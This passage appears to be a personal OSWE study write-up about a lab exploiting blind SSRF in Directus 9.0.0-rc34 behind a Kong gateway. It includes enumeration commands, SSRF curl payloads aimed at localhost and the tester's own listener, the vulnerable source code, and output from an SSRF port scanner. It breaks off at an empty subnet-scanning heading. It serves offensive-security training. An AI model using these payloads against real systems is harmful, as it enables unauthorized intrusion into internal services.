# Server-Side Request Forgery
This module demonstrates a black-box testing approach for microservices behind an API gateway, focusing on an SSRF vulnerability in Directus v9.0.0 rc34. The SSRF allowed discovery of internal services and led to remote code execution via a headless browser.
## Introduction to Microservices
Microservices are small, independent services that handle specific functions within a larger application. They replace monolithic architectures, allowing teams to develop and deploy components separately. For example, an e-commerce site might have separate services for Auth, Products, and Checkout.

These services often run in containers and communicate via DNS, especially in Docker environments. They expose functionality through APIs, typically RESTful.

An API gateway serves as a single entry point, handling tasks like authentication, rate limiting, and TLS. If bypassed, internal services may be exposed without proper security. Understanding URL structures is key to identifying and interacting with these services.

### Web Service URL Formats
Web service URLs typically follow structured patterns for routing requests. Common elements include versioning (e.g., `/v1/`), service names (e.g., `/products/`), and parameters (e.g., `/users/octocat`).

Some APIs use subdomains for routing, others use path-based patterns. Versioning may appear in the URL or be handled via request headers.
## API Discovery via Verb Tampering
RESTful APIs use HTTP methods (verbs) to define actions:

- `GET` retrieves data (typically read-only).
- `POST` creates new data or objects.
- `PUT`/`PATCH` update existing data—`PUT` replaces the whole object; `PATCH` updates parts.
- `DELETE` removes data.

Though these are standard conventions, implementations can vary. Some services may misuse methods (e.g., using `POST` for deletion) or not support all methods. SOAP APIs, by contrast, use `POST` for all actions, with operations defined as methods like lookupUser.

Because tools often default to `GET` requests, they may miss endpoints requiring other methods. Understanding method behavior is key when exploring or testing APIs.
### Initial Enumeration
We began API discovery by sending a request to the API gateway:
```bash
┌──(kali㉿kali)-[~]
└─$ curl -i http://apigateway:8000                                  
HTTP/1.1 404 Not Found
Date: Mon, 28 Jul 2025 17:18:18 GMT
Content-Type: application/json; charset=utf-8
Connection: keep-alive
Content-Length: 48
X-Kong-Response-Latency: 1
Server: kong/2.2.1

{"message":"no Route matched with those values"}                                                                                                                          
┌──(kali㉿kali)-[~]
└─$
```
Which returned a `404 Not Found` and revealed it’s powered by `Kong Gateway 2.2.1`. Attempts to access the Kong Admin API on port `8001` failed:
```bash
┌──(kali㉿kali)-[~]
└─$ curl -i http://apigateway:8001 
curl: (7) Failed to connect to apigateway port 8001 after 81 ms: Could not connect to server
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$
```
Using Gobuster, we brute-forced directories on port `8000` and captured endpoints returning `403 Forbidden` and `401 Unauthorized`, which often indicate valid paths that require authentication.

An API might return an HTTP `405 Method Not Allowed` response to a `GET` request. 
```bash
gobuster dir -u http://apigateway:8000 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -b "" -s "200,204,301,302,307,401,403,405,500"
```
Then we used in a second Gobuster scan proxied through Burp Suite for deeper analysis.

**Key findings:**
- `/render` endpoints returned `401 Unauthorized` with a `WWW-Authenticate: Key realm="kong"` header, indicating API key protection.
- `/users` and `/files` returned `403 Forbidden` responses with headers indicating a **`Directus`** (an instant app and API for your SQL database) backend and messages referencing `directus_users` and `directus_files` collections.

This helped identify three key services worth further testing:
- files
- users
- render

lets save them in a new file called `endpoints_simple.txt`
### Advanced Enumeration with Verb Tampering
Now that we have three potential API services, let's do another round of enumeration. URLs for RESTful APIs often follow a pattern of `<object>`/`<action>` or `<object>`/`<identifier>`. We might be able to discover more services by taking the list of endpoints we have already identified and iterating through a wordlist to find valid actions or identifiers.

We also need to keep in mind that web APIs might respond differently based on which HTTP request method we use. For example, a `GET` request to `/auth` might return an HTTP `404` response, while a `POST` request to the same URL returns an HTTP `200 OK` on a valid login or an HTTP `401 Unauthorized` on an invalid login attempt.

**Custom Script:** [route_buster.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/route_buster.py) 

A Python script was written to:
- Take a list of base endpoints (`-w`) and action words (`-a`).
- Send both `GET` and `POST` requests to all `/endpoint/action` combinations.
- Print results for responses not in [`204`, `401`, `403`, `404`].

**Output:**
```bash
┌──(kali㉿kali)-[~]
└─$ python3 route_buster.py -a /usr/share/wordlists/dirb/small.txt -w endpoints_simple.txt -t http://apigateway:8000 
Path                    -       GET     POST
/files/import            -      403     400
/users/frame             -      200     404
/users/home              -      200     404
/users/invite            -      403     400
/users/readme            -      200     404
/users/welcome           -      200     404
/users/wellcome          -      200     404
Wordlist complete. Goodbye.
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$
```
**Findings:**
- Several `/users/*` paths returned `200 OK` for `GET`, but no useful content.
- `/files/import` and `/users/invite` returned `400 Bad Request` for `POST` request instead of HTTP `403 Forbidden`, **suggesting the endpoints are active and expecting input**, but malformed request has been sent.
- A `POST` to `/files/import` revealed an error: `"url" is required`, indicating the API expects a `url` parameter.
```bash
──(kali㉿kali)-[~]
└─$ curl -i -X POST http://apigateway:8000/files/import             
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8
Content-Length: 86
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"56-egVc9WbgXViwv0ZIaPJS4bmcvSo"
Date: Mon, 28 Jul 2025 18:02:05 GMT
X-Kong-Upstream-Latency: 14
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"\"url\" is required","extensions":{"code":"INVALID_PAYLOAD"}}]}                                                                                                                          
┌──(kali㉿kali)-[~]
└─$
```
- The `/files/import` endpoint is **unauthenticated**, active, and potentially vulnerable to Server-Side Request Forgery (SSRF).
- Any time we discover an API or web form that includes a `url` parameter, we always want to check it for a Server-Side Request Forgery vulnerability.

## Server-Side Request Forgery Discovery
Server-Side Request Forgery (SSRF) is a vulnerability where an attacker tricks a server into making unauthorized requests. Because the request originates from the server, it may access internal resources, such as services on localhost, internal IP ranges, or systems behind firewalls or reverse proxies.

We always want to check `url` parameters in an API or web form for an SSRF vulnerability. 

First, let's determine if we can make it connect back to our Kali machine. We'll need to make sure our HTTP server is running.
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

```
Since the server returned the error as a JSON message, let's make our POST request use JSON as well.
```bash
┌──(kali㉿kali)-[~]
└─$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.45.203/ssrftest"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error
Content-Type: application/json; charset=utf-8
Content-Length: 108
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"6c-qz7bVW5hKPsQy2fT0mRPx8X4tuc"
Date: Mon, 28 Jul 2025 18:07:42 GMT
X-Kong-Upstream-Latency: 214
X-Kong-Proxy-Latency: 0
Via: kong/2.2.1

{"errors":[{"message":"Request failed with status code 404","extensions":{"code":"INTERNAL_SERVER_ERROR"}}]}                                                                                                                          
┌──(kali㉿kali)-[~]
└─$
```
Then check your HTTP sever:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.130.135 - - [28/Jul/2025 14:07:42] code 404, message File not found
192.168.130.135 - - [28/Jul/2025 14:07:42] "GET /ssrftest HTTP/1.1" 404 -

```
This backend service is vulnerable to SSRF. The user agent on the request is Axios, an HTTP client for Node.js.

Placing a file named `ssrftest` on the attacker's web server, a `POST` request to `/files/import` with the file’s URL triggered a backend request.
```bash
┌──(kali㉿kali)-[~]
└─$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.45.203/ssrftest"}' http://apigateway:8000/files/import
HTTP/1.1 403 Forbidden
Content-Type: application/json; charset=utf-8
Content-Length: 102
Connection: keep-alive
X-Powered-By: Directus
Vary: Origin
Access-Control-Allow-Credentials: true
Access-Control-Expose-Headers: Content-Range
ETag: W/"66-OPr7zxcJy7+HqVGdrFe1XpeEIao"
Date: Tue, 29 Jul 2025 00:23:17 GMT
X-Kong-Upstream-Latency: 166
X-Kong-Proxy-Latency: 1
Via: kong/2.2.1

{"errors":[{"message":"You don't have permission to access this.","extensions":{"code":"FORBIDDEN"}}]}                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$
```
Although the server returned a `403 Forbidden` error, Server logs confirmed the server accessed the file and received a `200 OK` response.
```bash
┌──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.130.135 - - [28/Jul/2025 20:23:17] "GET /ssrftest HTTP/1.1" 200 -

```
This confirms a **blind SSRF vulnerability**—the backend can make unauthenticated outbound requests, but the response data isn't returned to the attacker.
### Souorce Code Analysis
The SSRF vulnerability in Directus stems from how the `/files/import` endpoint handles requests before performing authentication or authorization.

#### In `/api/src/middleware/authenticate.ts`:
```ts
12  const authenticate: RequestHandler = asyncHandler(async (req, res, next) => {
13    req.accountability = {
14      user: null,
15      role: null,
16      admin: false,
17      ip: req.ip.startsWith('::ffff:') ? req.ip.substring(7) : req.ip,
18      userAgent: req.get('user-agent'),
19    };
20  
21    if (!req.token) return next();
22  
23    if (isJWT(req.token)) {
```
If no token is provided, the middleware **does not block the request**, and simply moves to the next handler.

The `req.accountability` object is initialized with `user: null` and `role: null`, allowing unauthenticated access to continue.

#### In `/api/src/controllers/files.ts`, the vulnerable endpoint begins at line `138`:
```ts
138  router.post(
139    '/import',
140    asyncHandler(async (req, res, next) => {
141      const { error } = importSchema.validate(req.body);
142  
143      if (error) {
144        throw new InvalidPayloadException(error.message);
145      }
146  
147      const service = new FilesService({
148        accountability: req.accountability,
149        schema: req.schema,
150      });
```
The function validates input, creates a service with `req.accountability`, then proceeds without checking auth.

The core SSRF happens here:
```ts
const fileResponse = await axios.get<NodeJS.ReadableStream>(req.body.url, {
  responseType: 'stream',
});

```
**Axios fetches the user-supplied URL** before any access checks, allowing attackers to trigger internal requests.

Because URL fetching (`axios.get`) happens **prior to any authentication or authorization**, this endpoint is vulnerable to **unauthenticated blind SSRF**.
### Exploiting Blind SSRF in Directus
Since we cannot access the results of the SSRF, how can we use it to further our attack? As we have already demonstrated, the application returns different messages for valid files and non-existing files. We can use these different messages to infer if a resource exists.

As a reminder, we receive an HTTP `403 Forbidden` when we request a valid resource and an HTTP `500 Internal Server Error` with "Request failed with status code `404`" when we request a resource that doesn't exist.

We tested whether the SSRF vulnerability could be used to make Directus connect to itself by targeting localhost.
```bash
curl -i -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:8000/"}' \
  http://apigateway:8000/files/import

```
Server response:
```bash
"connect ECONNREFUSED 127.0.0.1:8000"
```
This confirms Directus is not listening on port `8000` (likely API Gateway is). `"localhost"` refers to the Directus server, not the Kong API Gateway.

`localhost`:`8055` (Directus default port):
```bash
curl -i -X POST -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:8055/"}' \
  http://apigateway:8000/files/import

```
Server response:
```bash
"You don't have permission to access this."

```
This confirms that SSRF request reached Directus on port `8055` as it returned HTTP `403 Forbidden`, but confirms a valid internal resource was accessed.

We can easily verify that TCP port `8055` is **closed externally on the Kong API Gateway server**. We are likely dealing with two or more servers in this scenario.
#### Port Scanning via Blind SSRF
we can still use the different HTTP response codes and error messages to determine if we've requested a valid resource. We can use this information to write a script that will exploit the SSRF vulnerability and act as a port scanner.

Rather than exhaustively scanning all 65,535 ports, we optimize SSRF-based port scanning by focusing on a small set of common ports to speedup the proccess.

A Python script was written: [ssrf_port_scanner.py](https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/apigateway/ssrf_port_scanner.py)

`"You don't have permission"` → Port OPEN (valid resource)
`"ECONNREFUSED"` → Port CLOSED

Output:
```bash
┌──(kali㉿kali)-[~]
└─$ python3 ssrf_port_scanner.py -t http://apigateway:8000/files/import -s http://localhost --timeout 5                             
22      CLOSED
80      CLOSED
443     CLOSED
1433    CLOSED
1521    CLOSED
3306    CLOSED
3389    CLOSED
5000    CLOSED
5432    CLOSED
5900    CLOSED
6379    CLOSED
8000    CLOSED
8001    CLOSED
8055    OPEN (permission error indicates resource exists)
8080    CLOSED
8443    CLOSED
9000    CLOSED
                                                                                                                                                                                             
┌──(kali㉿kali)-[~]
└─$ 
```
The scan results are not inspiring. We only scanned a handful of ports, but only port 8055 is open, which the web service is running on. The common services for connecting to a server, such as SSH and RDP, are either not present or not running on their normal ports. There are no common database ports open either. We are likely communicating with a microservice running in a container.

#### Subnet Scanning with SSRF
